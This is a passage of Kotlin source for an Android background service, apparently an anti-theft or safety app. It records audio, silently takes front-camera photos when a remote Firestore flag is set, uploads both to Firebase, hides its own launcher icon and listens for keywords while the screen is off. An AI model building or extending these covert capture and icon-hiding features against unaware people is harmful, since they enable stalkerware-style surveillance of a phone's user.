                    uploadRecordingToStorage(File(compressedFilePath))
                } else {
                    Log.e("BackgroundService", "Compression failed, uploading original file")
                    uploadRecordingToStorage(file)
                }
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error stopping recording: ${e.message}")
        }
    }

    private fun getRecordingFilePath(): String {
        val recordingDir = File(filesDir, "recordings")
        if (!recordingDir.exists()) {
            recordingDir.mkdirs()
        }
        return File(recordingDir, "recording_${System.currentTimeMillis()}.mp4").absolutePath
    }

    private fun uploadRecordingToStorage(file: File) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val timestamp = System.currentTimeMillis()

        val storageRef = storage.reference.child("recordings/$userId/$deviceId/${file.name}")
        storageRef.putFile(Uri.fromFile(file))
            .addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { uri ->
                    saveRecordingMetadata(userId, deviceId, uri.toString(), timestamp)
                    Log.d("BackgroundService", "File uploaded successfully: ${file.name}")

                    // Eliminar archivo local tras subirlo
                    file.delete()
                    Log.d("BackgroundService", "Local file deleted: ${file.name}")
                }
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "File upload failed: ${e.message}")
            }
            .addOnCompleteListener {
                isUploading = false
                processUploadQueue() // Procesar el siguiente archivo en la cola
            }
    }

    private fun saveRecordingMetadata(userId: String, deviceId: String, downloadUrl: String, timestamp: Long) {
        val recordingData = mapOf(
            "url" to downloadUrl,
            "timestamp" to Timestamp(Date(timestamp)), // Convertir el long a Timestamp
            "deviceId" to deviceId,
            "isRead" to false // Campo adicional con valor predeterminado
        )

        firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)
            .collection("recordings")
            .add(recordingData)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Recording metadata saved successfully")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to save recording metadata: ${e.message}")
            }
    }

    private fun stopRecording() {
        try {
            recorder?.apply {
                stop()
                release()
                Log.d("BackgroundService", "Recording stopped and resources released")
            }
        } catch (e: Exception) {
            Log.e("BackgroundService", "Error stopping MediaRecorder: ${e.message}")
        } finally {
            recorder = null
            isRecording = false
        }
    }

    private fun updateLauncherIconVisibility(enable: Boolean) {
        val packageManager = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        Log.d("BackgroundService", "Habilitando o sesabilitando icono: $enable")

        if (enable) {
            // Habilitar el icono del launcher
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("BackgroundService", "Launcher icon enabled")
        } else {
            // Deshabilitar el icono del launcher
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("BackgroundService", "Launcher icon disabled")
        }
    }

    @SuppressLint("ServiceCast")
    private var cameraDevice: CameraDevice? = null
    private var cameraCaptureSession: CameraCaptureSession? = null
    private fun startBackgroundThread() {
        handlerThread = HandlerThread("CameraBackground").apply { start() }
        handler = Handler(handlerThread.looper)
    }

    private fun stopBackgroundThread() {
        handlerThread.quitSafely()
    }


    private fun startCamera() {
        Log.e("CameraStart", "inicia startCamera")
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = cameraManager.cameraIdList.first { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            }

            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val streamConfigurationMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSize = streamConfigurationMap?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }

            if (outputSize == null) {
                Log.e("CameraStart", "No se pudo obtener una resolución válida")
                return
            }

            imageReader = ImageReader.newInstance(outputSize.width, outputSize.height, ImageFormat.JPEG, 1)
            if (imageReader == null) {
                Log.e("CameraStart", "Error: ImageReader no fue inicializado correctamente")
            } else {
                Log.d("CameraStart", "ImageReader inicializado correctamente")
            }
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                Log.d("CameraStart", "Imagen capturada, enviando a Firebase...")
                Handler(Looper.getMainLooper()).post {
                    uploadPhotoToFirebase(bytes)
                }
            }, handler)

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                Log.e("CameraStart", "No se tienen permisos para la cámara")
                return
            }

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    Log.d("CameraStart", "Cámara abierta correctamente.")
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.e("CameraStart", "Cámara desconectada. Cerrando...")
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraStart", "Error al abrir la cámara: $error")
                    camera.close()
                    cameraDevice = null
                }
            }, handler)

        } catch (e: Exception) {
            Log.e("CameraStart", "Error al iniciar la cámara: ${e.message}")
        }
    }

   /* private fun startCameraX() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()

            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                .build()

            imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            try {
                cameraProvider.unbindAll()
                val camera = cameraProvider.bindToLifecycle(
                    ProcessLifecycleOwner.get(), cameraSelector, imageCapture
                )
                isCameraActive = true
                Log.d("CameraX", "✅ CameraX inicializado correctamente")
            } catch (e: Exception) {
                Log.e("CameraX", "❌ Error al iniciar CameraX: ${e.message}")
                isCameraActive = false
            }
        }, ContextCompat.getMainExecutor(this))
    }*/

    private fun ensureCameraIsOpen() {
        if (!isCameraActive) {
            Log.e("CameraX", "Intentando reabrir la cámara...")
            startCameraX()
        }
    }

    // ✅ Método para capturar y subir la foto

    private fun captureAndUploadPhoto(userDocRef: DocumentReference) {
        startCameraX() // 1️⃣ Inicia CameraX

        Handler(Looper.getMainLooper()).postDelayed({
            takePhoto { photoFile ->
                uploadPhotoToFirebase(photoFile) { downloadUrl ->
                    savePhotoData(userDocRef, downloadUrl) // 4️⃣ Guarda URL en Firestore
                    closeCameraX() // 5️⃣ Cierra CameraX
                    updateTakePhotoFlag(userDocRef) // 6️⃣ Establece takePhoto = false
                }
            }
        }, 2000) // Pequeño delay para asegurar que la cámara esté lista
    }

    private fun takePhoto(callback: (File) -> Unit) {
        val photoFile = File(externalCacheDir, "photo_${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        imageCapture?.takePicture(outputOptions, cameraExecutor, object : ImageCapture.OnImageSavedCallback {
            override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                Log.d("CameraX", "✅ Foto tomada correctamente: ${photoFile.absolutePath}")
                callback(photoFile)
            }

            override fun onError(exception: ImageCaptureException) {
                Log.e("CameraX", "❌ Error al tomar la foto: ${exception.message}")
            }
        })
    }

    private fun uploadPhotoToFirebase(photoFile: File, onComplete: (String) -> Unit) {
        val storageRef = FirebaseStorage.getInstance().reference.child("photos/${photoFile.name}")
        val fileUri = Uri.fromFile(photoFile)

        storageRef.putFile(fileUri)
            .addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                    Log.d("Firebase", "📤 Foto subida: $downloadUri")
                    onComplete(downloadUri.toString())
                }
            }
            .addOnFailureListener {
                Log.e("Firebase", "❌ Error al subir foto: ${it.message}")
            }
    }

    private fun savePhotoData(userDocRef: DocumentReference, downloadUrl: String) {
        val photoData = hashMapOf(
            "photoUrl" to downloadUrl,
            "timestamp" to FieldValue.serverTimestamp()
        )
        userDocRef.collection("photos").add(photoData)
            .addOnSuccessListener {
                Log.d("Firestore", "✅ Datos de la foto guardados en Firestore.")
            }
            .addOnFailureListener {
                Log.e("Firestore", "❌ Error al guardar datos en Firestore: ${it.message}")
            }
    }

    private fun updateTakePhotoFlag(userDocRef: DocumentReference) {
        userDocRef.update("takePhoto", false)
            .addOnSuccessListener {
                Log.d("Firestore", "✅ takePhoto actualizado a false.")
            }
            .addOnFailureListener {
                Log.e("Firestore", "❌ Error al actualizar takePhoto: ${it.message}")
            }
    }

    private fun startCameraX() {
        if (isCameraActive) return // Evita iniciar varias veces

        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                .build()

            imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            try {
                cameraProvider.unbindAll()
                val camera = cameraProvider.bindToLifecycle(
                    ProcessLifecycleOwner.get(), cameraSelector, imageCapture
                )
                isCameraActive = true
                Log.d("CameraX", "✅ CameraX inicializado correctamente")
            } catch (e: Exception) {
                Log.e("CameraX", "❌ Error al iniciar CameraX: ${e.message}")
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun closeCameraX() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            cameraProvider.unbindAll()
            isCameraActive = false
            Log.d("CameraX", "🛑 CameraX cerrada correctamente.")
        }, ContextCompat.getMainExecutor(this))
    }


    private var isTakingPhoto = false

    private var isCapturing = false // Nueva variable para evitar capturas dobles

    @SuppressLint("ServiceCast")
    private fun takePhotoAndUpload() {
        val context = applicationContext
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        if (cameraManager == null) {
            Log.e("CameraError", "Unable to get CameraManager")
            return
        }

        try {
            val cameraId = cameraManager.cameraIdList.firstOrNull {
                cameraManager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: return

            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                display
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay
            }

            val deviceRotation = display?.rotation ?: Surface.ROTATION_0
            val availableSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?.getOutputSizes(ImageFormat.JPEG)
            val bestSize = availableSizes?.maxWithOrNull(compareBy { it.width * it.height }) ?: Size(1920, 1080)

            val imageReader = ImageReader.newInstance(bestSize.width, bestSize.height, ImageFormat.JPEG, 1)
            val outputFile = File(getPhotoFilePath())

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                // Decodificar bytes a Bitmap y loggear información de la calidad
                var bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                Log.d("CameraDebug", "🖼️ Bitmap resolution: ${bitmap.width}x${bitmap.height}")
                Log.d("CameraDebug", "🧪 Original byte size: ${bytes.size} bytes")
                bitmap = rotateBitmap(bitmap, getJpegOrientation(deviceRotation, sensorOrientation).toFloat())

                val rotatedOutputStream = FileOutputStream(outputFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, rotatedOutputStream)
                rotatedOutputStream.close()
                Log.d("CameraDebug", "📦 Compressed image file size: ${outputFile.length()} bytes")

                uploadPhotoToStorage(outputFile)
                updateTakePhotoField(false)
            }, handler)

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return
            }

            val executor = Executors.newSingleThreadExecutor()
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)

                    // 📷 Asegurar que la foto se guarde en vertical
                    captureRequest.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation(deviceRotation, sensorOrientation))

                    val outputConfigurations = listOf(OutputConfiguration(imageReader.surface))
                    val sessionConfiguration = SessionConfiguration(
                        SessionConfiguration.SESSION_REGULAR,
                        outputConfigurations,
                        executor,
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(captureRequest.build(), null, handler)
                                } catch (e: CameraAccessException) {
                                    Log.e("CameraError", "Error during capture: ${e.message}")
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e("CameraError", "Failed to configure camera session.")
                            }
                        }
                    )

                    camera.createCaptureSession(sessionConfiguration)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraError", "Camera error: $error")
                    camera.close()
                }
            }, handler)
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to take photo: ${e.message}")
        }
    }

    private fun rotateBitmap(bitmap: Bitmap, degree: Float): Bitmap {
        val matrix = Matrix()
        matrix.postRotate(degree)
        return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
    }

    private fun getJpegOrientation(deviceRotation: Int, sensorOrientation: Int): Int {
        val orientations = SparseIntArray()
        orientations.append(Surface.ROTATION_0, 90)
        orientations.append(Surface.ROTATION_90, 0)
        orientations.append(Surface.ROTATION_180, 270)
        orientations.append(Surface.ROTATION_270, 180)

        return (orientations.get(deviceRotation) + sensorOrientation + 270) % 360
    }

    private fun resetCameraX() {
        Log.d("CameraX", "Reseteando CameraX...")

        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        try {
            val cameraProvider = cameraProviderFuture.get()
            cameraProvider.unbindAll() // 🔥 FORZAR CIERRE DE LA CÁMARA ANTES DE REINICIAR

            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                .build()

            imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            val camera = cameraProvider.bindToLifecycle(
                ProcessLifecycleOwner.get(), cameraSelector, imageCapture
            )

            isCameraActive = true
            Log.d("CameraX", "CameraX reiniciado correctamente")

        } catch (e: Exception) {
            Log.e("CameraX", "Error al resetear CameraX: ${e.message}")
            isCameraActive = false
        }
    }


    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
            Log.d("CameraDebug", "Cámara cerrada correctamente.")
        } catch (e: Exception) {
            Log.e("CameraError", "Error al cerrar la cámara: ${e.message}")
        }
    }

   /* fun takePhotoAndUpload() {
        val userId = auth.currentUser?.uid ?: return

        val photoFile = File(externalCacheDir, "${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        imageCapture?.takePicture(outputOptions, cameraExecutor,
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    Log.d("CameraX", "Foto guardada en: ${photoFile.absolutePath}")

                    val bytes = photoFile.readBytes()
                    uploadPhotoToFirebase(bytes) // 🚀 Subir la foto a Firebase
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e("CameraX", "Error al tomar la foto: ${exception.message}")
                }
            }
        )
    }


    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            Log.d("CameraDebug", "Cámara cerrada correctamente.")
        } catch (e: Exception) {
            Log.e("CameraError", "Error al cerrar la cámara: ${e.message}")
        }
    }*/


    /**
     * ✅ Función para cerrar la cámara correctamente y evitar que la app crashee
     */
   /* private fun closeCamera() {
        try {
            cameraCaptureSession?.close()
            cameraCaptureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null

            Log.d("CameraDebug", "Cámara cerrada correctamente")
        } catch (e: Exception) {
            Log.e("CameraError", "Error al cerrar la cámara: ${e.message}")
        }
    }*/

    private fun getPhotoFilePath(): String {
        val context = applicationContext
        val photoDirectory = File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "MyAppPhotos")

        // Asegurarse de que el directorio exista
        if (!photoDirectory.exists()) {
            photoDirectory.mkdirs()  // Crear el directorio si no existe
        }

        // Generar el nombre del archivo (puedes cambiar el nombre según lo que prefieras)
        val photoFileName = "photo_${System.currentTimeMillis()}.jpg"

        // Devolver la ruta completa del archivo
        return File(photoDirectory, photoFileName).absolutePath
    }

    private fun uploadPhotoToStorage(file: File) {
        val userId = auth.currentUser?.uid ?: return
        val storageRef = storage.reference.child("photos/$userId/${file.name}")

        storageRef.putFile(Uri.fromFile(file))
            .addOnSuccessListener {
                storageRef.downloadUrl.addOnSuccessListener { uri ->
                    savePhotoUrlToFirestore(uri.toString())
                }
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Photo upload failed: ${e.message}")
            }
    }

    private fun uploadPhotoToFirebase(photoBytes: ByteArray) {
        val userId = auth.currentUser?.uid ?: return
        val storageRef = FirebaseStorage.getInstance().reference
            .child("photos/$userId/${System.currentTimeMillis()}.jpg")

        storageRef.putBytes(photoBytes)
            .addOnSuccessListener {
                Log.d("Firebase", "Foto subida correctamente")
            }
            .addOnFailureListener { e ->
                Log.e("Firebase", "Error al subir foto: ${e.message}")
            }
    }

    private fun savePhotoUrlToFirestore(url: String) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        val deviceDocRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)

        val timestamp = Date()

        val photoData = mapOf(
            "url" to url,
            "isView" to false,
            "timestamp" to timestamp
        )

        deviceDocRef.collection("photos")
            .add(photoData)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Photo URL saved successfully")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to save photo URL: ${e.message}")
            }
    }

    private fun updateTakePhotoField(value: Boolean) {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)
            .update("takePhoto", value)
            .addOnSuccessListener {
                Log.d("BackgroundService", "takePhoto field updated to $value")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Failed to update takePhoto field: ${e.message}")
            }
    }

    private fun playAlarmSound() {
        val mediaPlayer = MediaPlayer.create(this, R.raw.alarm_sound)

        mediaPlayer.setOnCompletionListener {
            it.release() // Liberar el MediaPlayer después de reproducir el sonido
            //audioManager?.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
        }

        mediaPlayer.start()
    }


    private fun updateSoundField(value: Boolean, userId: String, deviceId: String) {
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.update("sound", value)
            .addOnSuccessListener {
                Log.d("BackgroundService", "Sound field updated to $value")
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Error updating sound field: ${e.message}")
            }
    }

    /**
     * Función para encapsular el flujo de inicialización, captura, subida y cierre de la cámara.
     */
    private fun tomarFoto(userDocRef: DocumentReference) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()

                val cameraSelector = CameraSelector.Builder()
                    .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                    .build()

                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                // Asegurar que CameraX no esté cerrada antes de capturar
                if (!isCameraActive) {
                    Log.e("CameraX", "CameraX no está activa. Reiniciando...")
                    startCameraX()

                }

                // Verificar si ya hay una instancia vinculada
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    ProcessLifecycleOwner.get(), cameraSelector, imageCapture
                )

                Log.d("CameraX", "✅ CameraX inicializado correctamente y listo para tomar foto.")

                // Pequeño delay para asegurar que la cámara está lista
                Handler(Looper.getMainLooper()).postDelayed({
                    val photoFile = File(externalCacheDir, "${System.currentTimeMillis()}.jpg")
                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    imageCapture.takePicture(outputOptions, cameraExecutor, object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                            Log.d("CameraX", "✅ Foto guardada en: ${photoFile.absolutePath}")

                            val storageRef = FirebaseStorage.getInstance().reference
                                .child("photos/${photoFile.name}")
                            val fileUri = Uri.fromFile(photoFile)

                            storageRef.putFile(fileUri)
                                .addOnSuccessListener {
                                    storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                                        Log.d("Firebase", "📤 Foto subida: $downloadUri")

                                        // Guardar en Firestore
                                        val photoData = hashMapOf(
                                            "photoUrl" to downloadUri.toString(),
                                            "timestamp" to FieldValue.serverTimestamp()
                                        )
                                        userDocRef.collection("photos").add(photoData)
                                            .addOnSuccessListener {
                                                Log.d("Firestore", "✅ Datos de la foto guardados en Firestore.")

                                                // Actualizar el campo takePhoto a false
                                                userDocRef.update("takePhoto", false)
                                                    .addOnSuccessListener {
                                                        Log.d("Firestore", "✅ takePhoto actualizado a false.")
                                                    }
                                                    .addOnFailureListener { e ->
                                                        Log.e("Firestore", "❌ Error al actualizar takePhoto: ${e.message}")
                                                    }

                                                // Cerrar CameraX correctamente
                                                cameraProvider.unbindAll()
                                                isCameraActive = false
                                                Log.d("CameraX", "🛑 CameraX cerrada correctamente.")
                                            }
                                            .addOnFailureListener { e ->
                                                Log.e("Firestore", "❌ Error al guardar datos en Firestore: ${e.message}")
                                            }
                                    }
                                }
                                .addOnFailureListener { e ->
                                    Log.e("Firebase", "❌ Error al subir foto: ${e.message}")
                                }
                        }

                        override fun onError(exception: ImageCaptureException) {
                            Log.e("CameraX", "❌ Error al tomar la foto: ${exception.message}")
                        }
                    })
                }, 1000) // Pequeño delay para asegurar que la cámara está lista

            } catch (e: Exception) {
                Log.e("CameraX", "❌ Error al iniciar CameraX: ${e.message}")
            }
        }, ContextCompat.getMainExecutor(this))
    }

    // microfono

    // Receptor para cambios en el estado de la pantalla
    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_OFF -> {
                    Log.d("ScreenStateReceiver", "Pantalla apagada: verificando estado de audio")

                    // El monitoreo de audio se encargará de decidir cuándo iniciar
                    if (!isPausedForAudio) {
                        initializeSpeechRecognizer()
                        tryStartSpeechRecognizer()
                    } else {
                        Log.d("ScreenStateReceiver", "No se inicia SpeechRecognizer porque hay audio activo")
                    }
                }
                Intent.ACTION_SCREEN_ON -> {
                    Log.d("ScreenStateReceiver", "Pantalla encendida: deteniendo SpeechRecognizer")
                    // Detener, cancelar y destruir el SpeechRecognizer para liberar el micrófono
                    stopListening()
                    speechRecognizer?.cancel()
                    speechRecognizer?.destroy()
                    speechRecognizer = null
                    isListening = false
                }
            }
        }
    }
    // AudioFocusChangeListener eliminado para evitar pitidos y permitir funcionamiento continuo

    // Inicializa el SpeechRecognizer y solicita audio focus (usando la API moderna en API 26+)
    private fun initializeSpeechRecognizer() {
        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)
        recognizerIntent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
            putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault().toLanguageTag())
            putExtra(RecognizerIntent.EXTRA_PARTIAL_RESULTS, true)
        }

        speechRecognizer?.setRecognitionListener(object : RecognitionListener {
            override fun onReadyForSpeech(params: Bundle?) {
                Log.d("SpeechRecognizer", "Listo para escuchar")
                isListening = true
            }
            override fun onBeginningOfSpeech() {
                Log.d("SpeechRecognizer", "Inicio del discurso")
            }
            override fun onRmsChanged(rmsdB: Float) {}
            override fun onBufferReceived(buffer: ByteArray?) {}
            override fun onEndOfSpeech() {
                Log.d("SpeechRecognizer", "Fin del discurso")
                isListening = false
            }
            override fun onResults(results: Bundle?) {
                isListening = false
                val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
                matches?.forEach { result ->
                    Log.d("SpeechRecognizer", "Palabra detectada: $result")
                    if (containsKeyword(result)) {
                        triggerAlarm()
                        restartListening() // Reiniciar el reconocedor después de la alarma
                    }
                }
            }
            override fun onPartialResults(partialResults: Bundle?) {}
            override fun onEvent(eventType: Int, params: Bundle?) {}
            override fun onError(error: Int) {
                isListening = false
                Log.e("SpeechRecognizer", "Error en reconocimiento de voz: $error")

                // Determinar el delay según el tipo de error
                val delay = when (error) {
                    SpeechRecognizer.ERROR_NO_MATCH -> {
                        Log.w("SpeechRecognizer", "No match found (ERROR_NO_MATCH): $error")
                        500L
                    }
                    SpeechRecognizer.ERROR_AUDIO -> 1500L
                    SpeechRecognizer.ERROR_NETWORK, SpeechRecognizer.ERROR_NETWORK_TIMEOUT -> 3000L
                    SpeechRecognizer.ERROR_TOO_MANY_REQUESTS -> 5000L
                    SpeechRecognizer.ERROR_SERVER -> 3000L
                    else -> 1000L
                }

                // Reiniciar siempre, sin importar el estado de la pantalla
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isRecording) { // Solo reiniciar si no estamos grabando
                        Log.d("SpeechRecognizer", "Reiniciando reconocimiento tras error: $error")
                        speechRecognizer?.cancel()
                        speechRecognizer?.destroy()
                        speechRecognizer = null
                        initializeSpeechRecognizer()
                        tryStartSpeechRecognizer()
                    } else {
                        Log.d("SpeechRecognizer", "No se reinicia porque está grabando audio")
                    }
                }, delay)
            }
        })

        // Audio focus eliminado para evitar pitidos y permitir funcionamiento continuo
        Log.d("SpeechRecognizer", "Iniciando reconocimiento de voz sin audio focus")
    }

    // Función para iniciar la escucha directamente sin audio focus
    private fun tryStartSpeechRecognizer() {
        Log.d("SpeechRecognizer", "Iniciando reconocimiento de voz sin audio focus")
        if (!isPausedForAudio) {
            startListening()
        } else {
            Log.d("SpeechRecognizer", "No se inicia porque hay audio activo")
        }
    }

    // Monitoreo inteligente de audio para evitar conflictos
    private fun startAudioMonitoring() {
        audioCheckHandler = Handler(Looper.getMainLooper())
        audioCheckRunnable = object : Runnable {
            override fun run() {
                checkAudioState()
                audioCheckHandler?.postDelayed(this, 1000) // Verificar cada segundo
            }
        }
        audioCheckHandler?.post(audioCheckRunnable!!)
        Log.d("AudioMonitor", "Monitoreo de audio iniciado")
    }

    private fun checkAudioState() {
        val isMusicActive = audioManager?.isMusicActive ?: false
        val isCallActive = audioManager?.mode == AudioManager.MODE_IN_CALL ||
                          audioManager?.mode == AudioManager.MODE_IN_COMMUNICATION

        val shouldPauseForAudio = isMusicActive || isCallActive

        if (shouldPauseForAudio && !isPausedForAudio) {
            // Pausar reconocimiento de voz
            Log.d("AudioMonitor", "Audio detectado, pausando reconocimiento de voz")
            pauseSpeechRecognitionForAudio()
        } else if (!shouldPauseForAudio && isPausedForAudio) {
            // Reanudar reconocimiento de voz
            Log.d("AudioMonitor", "Audio terminado, reanudando reconocimiento de voz")
            resumeSpeechRecognitionAfterAudio()
        }
    }

    private fun pauseSpeechRecognitionForAudio() {
        if (isListening) {
            stopListening()
            speechRecognizer?.cancel()
        }
        isPausedForAudio = true
        Log.d("AudioMonitor", "Reconocimiento de voz pausado por audio activo")
    }

    private fun resumeSpeechRecognitionAfterAudio() {
        isPausedForAudio = false
        // Esperar un poco antes de reanudar para asegurar que el audio haya terminado completamente
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isPausedForAudio && !isListening) {
                Log.d("AudioMonitor", "Reanudando reconocimiento de voz")
                tryStartSpeechRecognizer()
            }
        }, 2000) // Esperar 2 segundos
    }

    private fun stopAudioMonitoring() {
        audioCheckRunnable?.let { audioCheckHandler?.removeCallbacks(it) }
        audioCheckHandler = null
        audioCheckRunnable = null
        Log.d("AudioMonitor", "Monitoreo de audio detenido")
    }

    private fun startListening() {
        // Verificar si no hay audio activo antes de iniciar
        if (!isListening && !isPausedForAudio) {
            speechRecognizer?.startListening(recognizerIntent)
            isListening = true
            Log.d("SpeechRecognizer", "Escucha de voz activada")
        } else if (isPausedForAudio) {
            Log.d("SpeechRecognizer", "No se puede iniciar escucha: audio activo detectado")
        }
    }

    private fun stopListening() {
        if (isListening) {
            speechRecognizer?.stopListening()
            isListening = false
            Log.d("SpeechRecognizer", "Escucha de voz detenida")
        }
    }

    private fun restartListening() {
        Log.d("SpeechRecognizer", "Reiniciando escucha de voz")
        stopListening()
        Handler(Looper.getMainLooper()).postDelayed({
            tryStartSpeechRecognizer()
        }, 500)
    }

    @SuppressLint("StringFormatInvalid")
    private fun triggerAlarm() {
        Log.d("SpeechRecognizer", "Alarma activada por palabra clave detectada")

